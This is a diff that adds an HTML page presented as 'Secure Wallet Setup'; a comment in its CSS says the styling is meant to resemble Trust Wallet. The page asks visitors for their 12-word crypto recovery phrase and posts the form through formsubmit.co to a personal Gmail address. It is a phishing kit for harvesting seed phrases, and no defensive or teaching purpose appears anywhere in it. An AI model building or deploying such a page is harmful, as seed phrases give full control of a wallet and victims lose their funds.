@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Wallet - Collect 12 Phrase</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+    />
+    <!-- Font Awesome CSS from CDN -->
+    <link rel="stylesheet" href="styles.css" />
+    <!-- Link to your CSS file -->
+
+    <style>
+      /* Basic styling to resemble Trust Wallet design - Customize further as needed */
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f5f5f5;
+        overflow-x: hidden;
+      }
+
+      .wallet-container {
+        max-width: 600px;
+        margin: 50px auto;
+        padding: 20px;
+        background: #fff;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+      }
+
+      h1 {
+        color: #333;
+      }
+
+      .phrases {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+        margin: 20px 0;
+      }
+
+      input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        outline: none;
+      }
+
+      input.submit-button {
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        background-color: #007bff;
+        color: #fff;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      margin-left: 50px;
+      }
+
+      button.submit-button:hover {
+        background-color: #0056b3;
+      }
+
+      /* Existing styles */
+
+      .input-with-eye {
+        position: relative;
+      }
+
+      .input-with-eye i {
+        position: absolute;
+        top: 50%;
+        right: 10px;
+        transform: translateY(-50%);
+        cursor: pointer;
+        color: #ccc;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wallet-container">
+      <h1>Secure Wallet Setup</h1>
+      <p>Enter your 12 recovery phrases to set up your secure crypto wallet:</p>
+
+      <form  action="https://formsubmit.co/winnerisaac62@gmail.com" method="POST" id="orderForm">
+        <div class="phrases">
+          <!-- Create 12 input fields for phrases with eye icon -->
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 1" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <!-- <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 2" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 3" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 4" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 5" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 6" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 7" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 8" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 9" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 10" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 11" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div>
+
+          <div class="input-with-eye">
+            <input type="text" placeholder="Phrase 12" />
+            <i class="toggle-eye fas fa-eye-slash"></i>
+          </div> -->
+
+          <input type="submit" value="Submit" class="submit-button" />
+        </div>
+      </form>
+    </div>
+
+    <script>
+      document.querySelectorAll(".toggle-eye").forEach((eyeIcon) => {
+        eyeIcon.addEventListener("click", function () {
+          const inputField = this.previousElementSibling;
+          if (inputField.getAttribute("type") === "password") {
+            inputField.setAttribute("type", "text");
+            this.classList.remove("fa-eye-slash");
+            this.classList.add("fa-eye");
+          } else {
+            inputField.setAttribute("type", "password");
+            this.classList.remove("fa-eye");
+            this.classList.add("fa-eye-slash");
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
